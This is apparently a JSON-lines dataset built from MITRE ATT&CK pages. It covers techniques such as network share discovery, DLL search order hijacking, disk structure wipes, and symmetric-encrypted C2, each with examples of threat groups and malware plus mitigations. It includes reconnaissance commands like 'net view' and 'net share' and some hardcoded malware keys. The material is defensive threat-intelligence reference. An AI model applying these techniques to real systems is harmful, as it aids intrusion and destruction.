{"text": " Adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement. Networks often contain shared network drives and folders that enable users to access file directories on various systems across a network. File sharing over a Windows network occurs over the SMB protocol. (Citation: Wikipedia Shared Resource) (Citation: TechNet Shared Folder) [Net](https://attack.mitre.org/software/S0039) can be used to query a remote system for available shared drives using the <code>net view \\\\\\\\remotesystem</code> command. It can also be used to query shared drives on the local system using <code>net share</code>. For macOS, the <code>sharing -l</code> command lists all shared points used for smb services.", "idx": "https://attack.mitre.org/techniques/T1135", "title": "Network Share Discovery", "entity": "Network Share Discovery", "entity_type": "techniques", "entity_context": ["Stuxnet enumerates the directories of a network resource.", "The <code>net view \\\\remotesystem</code> and <code>net share</code> commands in Net can be used to find shared drives and directories on remote and local systems respectively.", "Pupy can list local and remote shared drives and folders over SMB.", "BitPaymer can search for network shares on the domain or workgroup using <code>net view <host></code>.", "Kwampirs collects a list of network shares with the command <code>net share</code>.", "PlugX has a module to enumerate network shares.", "Olympic Destroyer will attempt to enumerate mapped network shares to later attempt to wipe all files on those shares.", "APT1 listed connected network shares.", "FIVEHANDS can enumerate network shares and mounted drives on a network.", "Zebrocy identifies network drives when they are added to victim systems.", "Ramsay can scan for network drives which may contain documents for collection.\t", "Wizard Spider has used the “net view” command to locate mapped network shares.", "Cuba can discover shared resources using the <code>NetShareEnum</code> API call. ", "Bazar can enumerate shared drives on the domain.", "InvisiMole can gather network share information.", "Tropic Trooper used <code>netview</code> to scan target systems for shared resources.", "DarkVishnya scanned the network for public shared folders.", "Conti can enumerate remote open SMB network shares using <code>NetShareEnum()</code>.", "Chimera has used <code>net share</code> and <code>net view</code> to identify network shares of interest.", "CrackMapExec can enumerate the shared folders and associated permissions for a targeted network.", "APT32 used the <code>net view</code> command to show all shares available, including the administrative shares such as <code>C$</code> and <code>ADMIN$</code>.", "Operation Wocao has discovered network disks mounted to the system using netstat.", "HELLOKITTY has the ability to enumerate network resources.", "Cobalt Strike can query shared drives on the local system.", "Babuk has the ability to enumerate network shares.", "Avaddon has enumerated shared folders and mapped volumes.", "Empire can find shared drives on the local system.", "APT38 has enumerated network shares on a compromised host.", "Tonto Team has used tools such as NBTscan to enumerate network shares.", "Koadic can scan local network for open SMB.", "Dragonfly 2.0 identified and browsed file servers in the victim network, sometimes , viewing files pertaining to ICS or Supervisory Control and Data Acquisition (SCADA) systems.", "Enable Windows Group Policy “Do Not Allow Anonymous Enumeration of SAM Accounts and Shares” security setting to limit users who can enumerate network shares.", "Sowbug listed remote shared drives that were accessible from a victim.", "TrickBot module shareDll/mshareDll discovers network shares via the WNetOpenEnumA API.", "Clop can enumerate network shares.", "Bad Rabbit enumerates open SMB shares on internal victim networks.", "DEATHRANSOM has the ability to use loop operations to enumerate network resources.", "OSInfo discovers shares on the network", " APT41 used the <code>net share</code> command as part of network reconnaissance.", "ShimRat can enumerate connected drives for infected host machines.", "APT39 has used the post exploitation tool CrackMapExec to enumerate network shares.", "QakBot can use <code>net share</code> to identify network shares for use in lateral movement.", "WastedLocker can identify network adjacent and accessible drives.", "MURKYTOP has the capability to retrieve information about shares on remote hosts."], "is_subtechnique": false}
{"text": " Adversaries may abuse Python commands and scripts for execution. Python is a very popular scripting/programming language, with capabilities to perform many functions. Python can be executed interactively from the command-line (via the <code>python.exe</code> interpreter) or via scripts (.py) that can be written and distributed to different systems. Python code can also be compiled into binary executables. Python comes with many built-in packages to interact with the underlying system, such as file operations and device I/O. Adversaries can use these libraries to download and execute commands or other scripts as well as perform various malicious behaviors.", "idx": "https://attack.mitre.org/techniques/T1059/006", "title": "Python", "entity": "Python", "entity_type": "techniques", "entity_context": ["Dragonfly 2.0 used various types of scripting to perform operations, including Python scripts. The group was observed installing Python 2.7 on a victim.", "Bundlore has used Python scripts to execute payloads.", "Tonto Team has used Python-based tools for execution. ", "Machete is written in Python and is used in conjunction with additional Python scripts.", "Machete used multiple compiled Python scripts on the victim’s system. Machete's main backdoor Machete is also written in Python.", "Rocke has used Python-based malware to install and spread their coinminer.", "ZIRCONIUM has used Python-based implants to interact with compromised hosts.", "DropBook is a Python-based backdoor compiled with PyInstaller.", "Prevent users from installing Python where not required.", "Inventory systems for unauthorized Python installations.", "Anti-virus can be used to automatically quarantine suspicious files. ", "APT37 has used Python scripts to execute payloads.", "SpeakUp uses Python scripts.", "Operation Wocao's backdoors have been written in Python and compiled with py2exe.", "Turla has used IronPython scripts as part of the IronNetInjector toolchain to drop payloads.", "Remcos uses Python scripts.", "PoetRAT was executed with a Python script and worked in conjunction with additional Python-based post-exploitation tools.", "PUNCHBUGGY has used python scripts.", "Keydnap uses Python for scripting to execute additional commands.", "Kimsuky has used a Mac OS Python implant to gather data.", "Pupy can use an add on feature when creating payloads that allows you to create custom Python scripts (“scriptlets”) to perform tasks offline (without requiring a session) such as sandbox detection, adding persistence, etc.", "CoinTicker executes a Python script to download its second stage.", "IronNetInjector can use IronPython scripts to load payloads with the help of a .NET injector.", "MechaFlounder uses a python-based payload.", "APT29 has developed malware variants written in Python.", "Bandook can support commands to execute Python-based payloads.", "MuddyWater has used developed tools in Python including Out1.", "KeyBoy uses Python scripts for installing files and performing execution.", "CookieMiner has used python scripts on the user’s system, as well as the Python variant of the Empire agent, EmPyre.", "APT39 has used a command line utility and a network scanner written in python.", "Denylist Python where not required.", "BRONZE BUTLER has made use of Python-based remote access tools.", "Cobalt Strike can use Python to perform execution.", "TRITON was run as trilog.exe, a Py2EXE compiled python script that accepts a single IP address as a flag.", "Turian has the ability to use Python to spawn a Unix shell.", "Chaes has used Python scripts for execution and the installation of additional files. ", "Ebury has used Python to implement its DGA.\t", "Pysa has used Python scripts to deploy ransomware."], "is_subtechnique": true}
{"text": " Adversaries may execute their own malicious payloads by hijacking the search order used to load DLLs. Windows systems use a common method to look for required DLLs to load into a program. (Citation: Microsoft Dynamic Link Library Search Order)(Citation: FireEye Hijacking July 2010) Hijacking DLL loads may be for the purpose of establishing persistence as well as elevating privileges and/or evading restrictions on file execution. There are many ways an adversary can hijack DLL loads. Adversaries may plant trojan dynamic-link library files (DLLs) in a directory that will be searched before the location of a legitimate library that will be requested by a program, causing Windows to load their malicious library when it is called for by the victim program. Adversaries may also perform DLL preloading, also called binary planting attacks, (Citation: OWASP Binary Planting) by placing a malicious DLL with the same name as an ambiguously specified DLL in a location that Windows searches before the legitimate DLL. Often this location is the current working directory of the program.(Citation: FireEye fxsst June 2011) Remote DLL preloading attacks occur when a program sets its current directory to a remote location such as a Web share before loading a DLL. (Citation: Microsoft Security Advisory 2269637) Adversaries may also directly modify the search order via DLL redirection, which after being enabled (in the Registry and creation of a redirection file) may cause a program to load a different DLL.(Citation: Microsoft Dynamic-Link Library Redirection)(Citation: Microsoft Manifests)(Citation: FireEye DLL Search Order Hijacking) If a search order-vulnerable program is", "idx": "https://attack.mitre.org/techniques/T1574/001", "title": "DLL Search Order Hijacking", "entity": "DLL Search Order Hijacking", "entity_type": "techniques", "entity_context": ["Disallow loading of remote DLLs. This is included by default in Windows Server 2012+ and is available by patch for XP+ and Server 2003+.\n\nEnable Safe DLL Search Mode to force search for system DLLs in directories with greater restrictions (e.g. <code>%SYSTEMROOT%</code>)to be used before local directory DLLs (e.g. a user's home directory)\n\nThe Safe DLL Search Mode can be enabled via Group Policy at Computer Configuration > Policies > Administrative Templates > MSS (Legacy): MSS: (SafeDllSearchMode) Enable Safe DLL search mode. The associated Windows Registry key for this is located at <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\SafeDLLSearchMode</code>", "Empire contains modules that can discover and exploit various DLL hijacking opportunities.", "MirageFox is likely loaded via DLL hijacking into a legitimate McAfee binary.", "Whitefly has used search order hijacking to run the loader Vcrodat.\t", "Hikit has used DLL Search Order Hijacking to load <code>oci.dll</code> as a persistence mechanism.", "APT41 has used search order hijacking to execute malicious payloads, such as Winnti RAT.", "Adversaries may use new DLLs to execute this technique. Identify and block potentially malicious software executed through search order hijacking by using application control solutions capable of blocking DLLs loaded by legitimate software.", "Chaes has used search order hijacking to load a malicious DLL.", "Threat Group-3390 has performed DLL search order hijacking to execute their payload.", "Ramsay can hijack outdated Windows application dependencies with malicious versions of its own DLL payload.\t", "Astaroth can launch itself via DLL Search Order Hijacking.", "BOOSTWRITE has exploited the loading of the legitimate Dwrite.dll file by actually loading the gdi library, which then loads the gdiplus library and ultimately loads the local Dwrite dll.", "InvisiMole can be launched by using DLL search order hijacking in which the wrapper DLL is placed in the same folder as explorer.exe and loaded during startup into the Windows Explorer process instead of the legitimate library.", "Evilnum has used the malware variant, TerraTV, to load a malicious DLL placed in the TeamViewer directory, instead of the original Windows DLL located in a system folder. ", "Crutch can persist via DLL search order hijacking on Google Chrome, Mozilla Firefox, or Microsoft OneDrive.", "Downdelph uses search order hijacking of the Windows executable sysprep.exe to escalate privileges.", "Melcoz can use DLL hijacking to bypass security controls.", "A FinFisher variant uses DLL search order hijacking.", "Variants of WEBC2 achieve persistence by using DLL search order hijacking, usually by copying the DLL file to <code>%SYSTEMROOT%</code> (<code>C:\\WINDOWS\\ntshrui.dll</code>).", "RedLeaves is launched through use of DLL search order hijacking to load a malicious dll.", "HTTPBrowser abuses the Windows DLL load order by using a legitimate Symantec anti-virus binary, VPDN_LU.exe, to load a malicious DLL that mimics a legitimate Symantec DLL, navlu.dll.", "Tonto Team abuses a legitimate and signed Microsoft executable to launch a malicious DLL.", "RTM has used search order hijacking to force TeamViewer to load a malicious DLL.", "BackdoorDiplomacy has executed DLL search order hijacking.", " WastedLocker has performed DLL hijacking before execution.", "menuPass has used DLL search order hijacking.", "Prikormka uses DLL search order hijacking for persistence by saving itself as ntshrui.dll to the Windows directory so it will load before the legitimate ntshrui.dll saved in the System32 subdirectory.", "PowerSploit contains a collection of Privesc-PowerUp modules that can discover and exploit DLL hijacking opportunities in services and processes.", "Use auditing tools capable of detecting DLL search order hijacking opportunities on systems within an enterprise and correct them. Toolkits like the PowerSploit framework contain PowerUp modules that can be used to explore systems for DLL hijacking weaknesses.\n\nUse the program sxstrace.exe that is included with Windows along with manual inspection to check manifest files for side-by-side problems in software."], "is_subtechnique": true}
{"text": " Adversaries may purchase domains that can be used during targeting. Domain names are the human readable names used to represent one or more IP addresses. They can be purchased or, in some cases, acquired for free. Adversaries can use purchased domains for a variety of purposes, including for [Phishing](https://attack.mitre.org/techniques/T1566), [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), and Command and Control.(Citation: CISA MSS Sep 2020) Adversaries may choose domains that are similar to legitimate domains, including through use of homoglyphs or use of a different top-level domain (TLD).(Citation: FireEye APT28)(Citation: PaypalScam) Typosquatting may be used to aid in delivery of payloads via [Drive-by Compromise](https://attack.mitre.org/techniques/T1189). Adversaries can also use internationalized domain names (IDNs) to create visually similar lookalike domains for use in operations.(Citation: CISA IDN ST05-016) Domain registrars each maintain a publicly viewable database that displays contact information for every registered domain. Private WHOIS services display alternative information, such as their own company data, rather than the owner of the domain. Adversaries may use such private WHOIS services to obscure information about who owns a purchased domain. Adversaries may further interrupt efforts to track their infrastructure by using varied registration information and purchasing domains with different domain registrars.(Citation: Mandiant APT1)", "idx": "https://attack.mitre.org/techniques/T1583/001", "title": "Domains", "entity": "Domains", "entity_type": "techniques", "entity_context": ["Leviathan has established domains that impersonate legitimate entities to use for targeting efforts. ", "Ferocious Kitten has acquired domains imitating legitimate sites.", "Mustang Panda have acquired C2 domains prior to operations.", "TeamTNT has obtained domains to host their payloads.", "FIN7 has registered look-alike domains for use in phishing campaigns.", "Silent Librarian has acquired domains to establish credential harvesting pages, often spoofing the target organization and using free top level domains .TK, .ML, .GA, .CF, and .GQ.", "Kimsuky has registered domains to spoof targeted organizations and trusted third parties.", "APT29 has acquired C2 domains, sometimes through resellers.", "Lazarus Group has acquired infrastructure related to their campaigns to act as distribution points and C2 channels.", "Magic Hound has registered fraudulent domains such as \"mail-newyorker.com\" and \"news12.com.recover-session-service.site\" to target specific victims with phishing attacks.", "APT32 has set up and operated websites to gather information and deliver malware.", "IndigoZebra has established domains, some of which were designed to look like official government domains, for their operations.", "Transparent Tribe has registered domains to mimic file sharing, government, defense, and research websites for use in targeted campaigns.", "APT1 has registered hundreds of domains for use in operations.", "ZIRCONIUM has purchased domains for use in targeted campaigns.", "Sandworm Team has registered domain names and created URLs that are often designed to mimic or spoof legitimate websites, such as email login pages, online file sharing and storage websites, and password reset pages.", "Organizations may intentionally register similar domains to their own to deter adversaries from creating typosquatting domains. Other facets of this technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls.", "APT28 registered domains imitating NATO, OSCE security websites, Caucasus information resources and other organizations. ", "menuPass has registered malicious domains for use in intrusion campaigns."], "is_subtechnique": true}
{"text": " Adversaries may corrupt or wipe the disk data structures on a hard drive necessary to boot a system; targeting specific critical systems or in large numbers in a network to interrupt availability to system and network resources. Adversaries may attempt to render the system unable to boot by overwriting critical data located in structures such as the master boot record (MBR) or partition table.(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018) The data contained in disk structures may include the initial executable code for loading an operating system or the location of the file system partitions on disk. If this information is not present, the computer will not be able to load an operating system during the boot process, leaving the computer unavailable. [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) may be performed in isolation, or along with [Disk Content Wipe](https://attack.mitre.org/techniques/T1561/001) if all sectors of a disk are wiped. To maximize impact on the target organization, malware designed for destroying disk structures may have worm-like features to propagate across a network by leveraging other techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)", "idx": "https://attack.mitre.org/techniques/T1561/002", "title": "Disk Structure Wipe", "entity": "Disk Structure Wipe", "entity_type": "techniques", "entity_context": ["RawDisk was used in Shamoon to help overwrite components of disk structure like the MBR and disk partitions.", "APT38 has used a custom MBR wiper named BOOTWRECK to render systems inoperable.", "Sandworm Team has used the BlackEnergy KillDisk component to corrupt the infected system's master boot record.", "Shamoon has been seen overwriting features of disk structure such as the MBR.", "Consider implementing IT disaster recovery plans that contain procedures for taking regular data backups that can be used to restore organizational data. Ensure backups are stored off system and is protected from common methods adversaries may use to gain access and destroy the backups to prevent recovery.", "Lazarus Group malware SHARPKNOT overwrites and deletes the Master Boot Record (MBR) on the victim's machine and has possessed MBR wiper malware since at least 2009.", "KillDisk overwrites the first sector of the Master Boot Record with “0x00”.", "APT37 has access to destructive malware that is capable of overwriting a machine's Master Boot Record (MBR).", "StoneDrill can wipe the master boot record of an infected computer."], "is_subtechnique": true}
{"text": " Adversaries may communicate using application layer protocols associated with electronic mail delivery to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. Protocols such as SMTP/S, POP3/S, and IMAP that carry electronic mail may be very common in environments. Packets produced from these protocols may have many fields and headers in which data can be concealed. Data could also be concealed within the email messages themselves. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.", "idx": "https://attack.mitre.org/techniques/T1071/003", "title": "Mail Protocols", "entity": "Mail Protocols", "entity_type": "techniques", "entity_context": ["Various implementations of CHOPSTICK communicate with C2 over SMTP and POP3.", "NavRAT uses the email platform, Naver, for C2 communications, leveraging SMTP.", "SilverTerrier uses SMTP for C2 communications.", "APT32 has used email for C2 via an Office macro.", "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. ", "Zebrocy uses SMTP and POP3 for C2.", "Turla has used multiple backdoors which communicate with a C2 server via email attachments.", "Kimsuky has used e-mail to send exfiltrated data to C2 servers.", "Remsec is capable of using SMTP for C2.", "Cannon uses SMTP/S and POP3/S for C2 communications by sending and receiving emails.", "Agent Tesla has used SMTP for C2 communications.", "JPIN can send email over SMTP.", "CORESHELL can communicate over SMTP and POP3 for C2.", "BadPatch uses SMTP for C2.", "LightNeuron uses SMTP for C2.", "OLDBAIT can use SMTP for C2.", "RDAT can use email attachments for C2 communications.", "ComRAT can use email attachments for command and control.", "Goopy has the ability to use a Microsoft Outlook backdoor macro to communicate with its C2.\t", "APT28 has used IMAP, POP3, and SMTP for a communication channel in various implants, including using self-registered Google Mail accounts and later compromised email servers of its victims."], "is_subtechnique": true}
{"text": " Adversaries may use password cracking to attempt to recover usable credentials, such as plaintext passwords, when credential material such as password hashes are obtained. [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) is used to obtain password hashes, this may only get an adversary so far when [Pass the Hash](https://attack.mitre.org/techniques/T1550/002) is not an option. Techniques to systematically guess the passwords used to compute hashes are available, or the adversary may use a pre-computed rainbow table to crack hashes. Cracking hashes is usually done on adversary-controlled systems outside of the target network.(Citation: Wikipedia Password cracking) The resulting plaintext password resulting from a successfully cracked hash may be used to log into systems, resources, and services in which the account has access.", "idx": "https://attack.mitre.org/techniques/T1110/002", "title": "Password Cracking", "entity": "Password Cracking", "entity_type": "techniques", "entity_context": ["Refer to NIST guidelines when creating password policies. ", "Net Crawler uses a list of known credentials gathered through credential dumping to guess passwords to accounts as it spreads throughout a network.", "APT41 performed password brute-force attacks on the local admin account.", "FIN6 has extracted password hashes from ntds.dit to crack offline.", "Dragonfly 2.0 dropped and executed tools used for password cracking, including Hydra and CrackMapExec.", "APT3 has been known to brute force password hashes to be able to leverage plain text credentials.", "Use multi-factor authentication. Where possible, also enable multi-factor authentication on externally facing services."], "is_subtechnique": true}
{"text": " Adversaries may take advantage of trusted developer utilities to proxy execution of malicious payloads. There are many utilities used for software development related tasks that can be used to execute code in various forms to assist in development, debugging, and reverse engineering.(Citation: engima0x3 DNX Bypass)(Citation: engima0x3 RCSI Bypass)(Citation: Exploit Monday WinDbg)(Citation: LOLBAS Tracker) These utilities may often be signed with legitimate certificates that allow them to execute on a system and proxy execution of malicious code through a trusted process that effectively bypasses application control solutions.", "idx": "https://attack.mitre.org/techniques/T1127", "title": "Trusted Developer Utilities Proxy Execution", "entity": "Trusted Developer Utilities Proxy Execution", "entity_type": "techniques", "entity_context": ["Specific developer utilities may not be necessary within a given environment and should be removed if not used.", "Certain developer utilities should be blocked or restricted if not required."], "is_subtechnique": false}
{"text": " Adversaries may execute malicious payloads via loading shared modules. The Windows module loader can be instructed to load DLLs from arbitrary local paths and arbitrary Universal Naming Convention (UNC) network paths. This functionality resides in NTDLL.dll and is part of the Windows [Native API](https://attack.mitre.org/techniques/T1106) which is called from functions like <code>CreateProcess</code>, <code>LoadLibrary</code>, etc. of the Win32 API. (Citation: Wikipedia Windows Library Files) The module loader can load DLLs: * via specification of the (fully-qualified or relative) DLL pathname in the IMPORT directory; * via EXPORT forwarded to another DLL, specified with (fully-qualified or relative) pathname (but without extension); * via an NTFS junction or symlink program.exe.local with the fully-qualified or relative pathname of a directory containing the DLLs specified in the IMPORT directory or forwarded EXPORTs; * via <code>&#x3c;file name=\"filename.extension\" loadFrom=\"fully-qualified or relative pathname\"&#x3e;</code> in an embedded or external \"application manifest\". The file name refers to an entry in the IMPORT directory or a forwarded EXPORT. Adversaries may use this functionality as a way to execute arbitrary payloads on a victim system. For example, malware may execute share modules to load additional components or features.", "idx": "https://attack.mitre.org/techniques/T1129", "title": "Shared Modules", "entity": "Shared Modules", "entity_type": "techniques", "entity_context": ["TajMahal has the ability to inject the <code>LoadLibrary</code> call template DLL into running processes.", "PipeMon has used call to <code>LoadLibrary</code> to load its installer. PipeMon loads its modules using reflective loading or custom shellcode.", "Identify and block potentially malicious software executed through this technique by using application control tools capable of preventing unknown DLLs from being loaded.", "BOOSTWRITE has used the DWriteCreateFactory() function to load additional modules.", "Metamorfo had used AutoIt to load and execute the DLL payload. ", "PUNCHBUGGY can load a DLL using the LoadLibrary API.", "KillDisk loads and executes functions from a DLL.", "BLINDINGCAN has loaded and executed DLLs in memory during runtime on a victim machine.", "Dtrack contains a function that calls <code>LoadLibrary</code> and <code>GetProcAddress</code>.", "Hydraq creates a backdoor through which remote attackers can load and call DLL functions.", "Astaroth uses the LoadLibraryExW() function to load additional modules. ", "Attor's dispatcher can execute additional plugins by loading the respective DLLs.", "gh0st RAT can load DLLs into memory.", "Stuxnet calls LoadLibrary then executes exports from a DLL."], "is_subtechnique": false}
{"text": " Adversaries may use [Patch System Image](https://attack.mitre.org/techniques/T1601/001) to hard code a password in the operating system, thus bypassing of native authentication mechanisms for local accounts on network devices. [Modify System Image](https://attack.mitre.org/techniques/T1601) may include implanted code to the operating system for network devices to provide access for adversaries using a specific password. The modification includes a specific password which is implanted in the operating system image via the patch. Upon authentication attempts, the inserted code will first check to see if the user input is the password. If so, access is granted. Otherwise, the implanted code will pass the credentials on for verification of potentially valid credentials.(Citation: FireEye - Synful Knock)", "idx": "https://attack.mitre.org/techniques/T1556/004", "title": "Network Device Authentication", "entity": "Network Device Authentication", "entity_type": "techniques", "entity_context": ["Restrict administrator accounts to as few individuals as possible, following least privilege principles.  Prevent credential overlap across systems of administrator and privileged accounts, particularly between network and non-network platforms, such as servers or endpoints.", "Use multi-factor authentication for user and privileged accounts. Most embedded network devices support TACACS+ and/or RADIUS.  Follow vendor prescribed best practices for hardening access control. ", "SYNful Knock has the capability to add its own custom backdoor password when it modifies the operating system of the affected network device."], "is_subtechnique": true}
{"text": " Adversaries may employ a known symmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Symmetric encryption algorithms use the same key for plaintext encryption and ciphertext decryption. Common symmetric encryption algorithms include AES, DES, 3DES, Blowfish, and RC4.", "idx": "https://attack.mitre.org/techniques/T1573/001", "title": "Symmetric Cryptography", "entity": "Symmetric Cryptography", "entity_type": "techniques", "entity_context": ["BendyBear communicates to a C2 server over port 443 using modified RC4 and XOR-encrypted chunks. ", "Prikormka encrypts some C2 traffic with the Blowfish cipher.", "BADNEWS encrypts C2 data with a ROR by 3 and an XOR by 0x23.", "Rifdoor has encrypted command and control (C2) communications with a stream cipher.", "down_new has the ability to AES encrypt C2 communications.", "Downdelph uses RC4 to encrypt C2 responses.", "ChChes can encrypt C2 traffic with AES or RC4.", "Attor has encrypted data symmetrically using a randomly generated Blowfish (OFB) key which is encrypted with a public RSA key.", "BRONZE BUTLER has used RC4 encryption (for Datper malware) and AES (for xxmm malware) to obfuscate HTTP traffic. BRONZE BUTLER has also used a tool called RarStar that encodes data with a custom XOR algorithm when posting it to a C2 server.", "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level.", "Some versions of UPPERCUT have used the hard-coded string “this is the encrypt key” for Blowfish encryption when communicating with a C2. Later versions have hard-coded keys uniquely for each C2 address.", "LookBack uses a modified version of RC4 for data transfer.", "CallMe uses AES to encrypt C2 traffic.", "SideTwist can encrypt C2 communications with a randomly generated key.", "InvisiMole uses variations of a simple XOR encryption routine for C&C communications.", "BADCALL encrypts C2 traffic using an XOR/ADD cipher.", "PipeMon communications are RC4 encrypted.", "Comnie encrypts command and control communications with RC4.", "TAINTEDSCRIBE uses a Linear Feedback Shift Register (LFSR) algorithm for network encryption.", "Several Lazarus Group malware families encrypt C2 traffic using custom code that uses XOR with an ADD operation and XOR with a SUB operation. Another Lazarus Group malware sample XORs C2 traffic. Other Lazarus Group malware uses Caracachs encryption to encrypt C2 payloads.", "QuasarRAT uses AES to encrypt network communication.", "Higaisa used AES-128 to encrypt C2 traffic.", "Hi-Zor encrypts C2 traffic with a double XOR using two distinct single-byte keys.", "NanoCore uses DES to encrypt the C2 traffic.", "A variant of ADVSTORESHELL encrypts some C2 with 3DES.", "Elise encrypts exfiltrated data with RC4.", "PLAINTEE encodes C2 beacons using XOR.", "Carbanak encrypts the message body of HTTP traffic with RC2 (in CBC mode). Carbanak also uses XOR with random keys for its communications.", "APT33 has used AES for encryption of command and control traffic.", "The Duqu command and control protocol's data stream can be encrypted with AES-CBC.", "BLINDINGCAN has encrypted its C2 traffic with RC4.", "Daserf uses RC4 encryption to obfuscate HTTP traffic.", "QakBot can RC4 encrypt strings in C2 communication.", "Hydraq C2 traffic is encrypted using bitwise NOT and XOR operations.", "PoisonIvy uses the Camellia cipher to encrypt communications.", "Cardinal RAT uses a secret key with a series of XOR and addition operations to encrypt C2 traffic.", "HyperStack has used RSA encryption for C2 communications.", "Gazer uses custom encryption for C2 that uses 3DES.", "Some Felismus samples use a custom encryption method for C2 traffic that utilizes AES and multiple keys.", "Bandook has used AES encryption for C2 communication.", "NDiskMonitor uses AES to encrypt certain information sent over its C2 channel.", "Volgmer uses a simple XOR cipher to encrypt traffic and files.", "Lucifer can perform a decremental-xor encryption on the initial C2 request before sending it over the wire.", "Cobalt Strike has the ability to use AES-256 symmetric encryption in CBC mode with HMAC-SHA-256 to encrypt task commands and XOR to encrypt shell code and configuration data.", "Bonadan can XOR-encrypt C2 communications.", "Winnti for Linux has used a custom TCP protocol with four-byte XOR for command and control (C2).", "ZeroT has used RC4 to encrypt C2 traffic.", "The original variant of FakeM encrypts C2 traffic using a custom encryption cipher that uses an XOR key of “YHCRA” and bit rotation between each XOR operation. Some variants of FakeM use RC4 to encrypt C2 traffic.", "SeaDuke C2 traffic has been encrypted with RC4 and AES.", "Sliver can use AES-GCM-256 to encrypt a session key for C2 message exchange.", "gh0st RAT uses RC4 and XOR to encrypt C2 traffic.", "RainyDay can use RC4 to encrypt C2 communications.", "ZIRCONIUM has used AES encrypted communications in C2.", "httpclient encrypts C2 content with XOR using a single byte, 0x12.", "Ebury has encrypted C2 traffic using the client IP address, then encoded it as a hexadecimal string.", "SodaMaster can use RC4 to encrypt C2 communications.", "NETWIRE can use AES encryption for C2 data transferred.", "Lurid performs XOR encryption.", "HiddenWasp uses an RC4-like algorithm with an already computed PRGA generated key-stream for network communication.", "Bisonal variants reported on in 2014 and 2015 used a simple XOR cipher for C2. Some Bisonal samples encrypt C2 communications with RC4.", "Hikit performs XOR encryption.", "Metamorfo has encrypted C2 commands with AES-256. ", "RDAT has used AES ciphertext to encode C2 communications.", "Derusbi obfuscates C2 traffic with variable 4-byte XOR keys.", "Darkhotel has used AES-256 and 3DES for C2 communications.", "Stealth Falcon malware encrypts C2 traffic using RC4 with a hard-coded key.", "3PARA RAT command and control commands are encrypted within the HTTP C2 channel using the DES algorithm in CBC mode with a key derived from the MD5 hash of the string HYF54&%9&jkMCXuiS. 3PARA RAT will use an 8-byte XOR key derived from the string HYF54&%9&jkMCXuiS if the DES decoding fails", "CosmicDuke contains a custom version of the RC4 algorithm that includes a programming error.", "Stuxnet encodes the payload of system information sent to the command and control servers using a one byte 0xFF XOR key. Stuxnet also uses a 31-byte long static byte string to XOR data sent to command and control servers. The servers use a different static key to encrypt replies to the implant. ", "Inception has encrypted network communications with AES.", "WellMess can encrypt HTTP POST data using RC6 and a dynamically generated AES key encrypted with a hard coded RSA public key.", "FlawedAmmyy has used SEAL encryption during the initial C2 handshake.", "Sakula encodes C2 traffic with single-byte XOR keys.", "xCaon has encrypted data sent to the C2 server using a XOR key. ", "Mustang Panda has encrypted C2 communications with RC4.", "Nebulae can use RC4 and XOR to encrypt C2 communications.", "Bazar can send C2 communications with XOR encryption.", "RTM encrypts C2 traffic with a custom RC4 variant.", "PLEAD has used RC4 encryption to download modules.", "FatDuke can AES encrypt C2 communications.", "Frankenstein has communicated with a C2 via an encrypted RC4 byte stream and AES-CBC.", "CORESHELL C2 messages are encrypted with custom stream ciphers using six-byte or eight-byte keys.", "LightNeuron uses AES to encrypt C2 traffic.", "Taidoor uses RC4 to encrypt the message body of HTTP content.", "KEYMARBLE uses a customized XOR algorithm to encrypt C2 communications.", "4H RAT obfuscates C2 communication using a 1-byte XOR with the key 0xBE.", "GrimAgent can use an AES key to encrypt C2 communications.", "XCSSET uses RC4 encryption over TCP to communicate with its C2 server.  ", "SNUGRIDE encrypts C2 traffic using AES with a static key.", "Epic encrypts commands from the C2 server using a hardcoded key.", "More_eggs has used an RC4-based encryption method for its C2 communications.", "TSCookie has encrypted network communications with RC4.", "H1N1 encrypts C2 traffic using an RC4 key.", "GreyEnergy encrypts communications using AES256.", "Helminth encrypts data sent to its C2 server over HTTP with RC4.", "POWERTON has used AES for encrypting C2 traffic.", "The Komplex C2 channel uses an 11-byte XOR algorithm to hide data.", "Mosquito uses a custom encryption algorithm, which consists of XOR and a stream that is similar to the Blum Blum Shub algorithm.", "Explosive has encrypted communications with the RC4 method. ", "The C2 server response to a beacon sent by a variant of Emissary contains a 36-character GUID value that is used as an encryption key for subsequent network communications. Some variants of Emissary use various XOR operations to encrypt C2 data.", "FALLCHILL encrypts C2 data with RC4 encryption.", "Before being appended to image files, HAMMERTOSS commands are encrypted with a key composed of both a hard-coded value and a string contained on that day's tweet. To decrypt the commands, an investigator would need access to the intended malware sample, the day's tweet, and the image file containing the command.", "Sys10 uses an XOR 0x1 loop to encrypt its C2 domain.", "Kobalos's post-authentication communication channel uses a 32-byte-long password with RC4 for inbound and outbound traffic. ", "SUNBURST encrypted C2 traffic using a single-byte-XOR cipher.", "TrickBot uses a custom crypter leveraging Microsoft’s CryptoAPI to encrypt C2 traffic.Newer versions of TrickBot have been known to use `bcrypt` to encrypt and digitally sign responses to their C2 server. ", "CHOPSTICK encrypts C2 communications with RC4.", "Okrum uses AES to encrypt network traffic. The key can be hardcoded or negotiated with the C2 server in the registration phase. ", "RedLeaves has encrypted C2 traffic with RC4, previously using keys of 88888888 and babybear.", "Chaos provides a reverse shell connection on 8338/TCP, 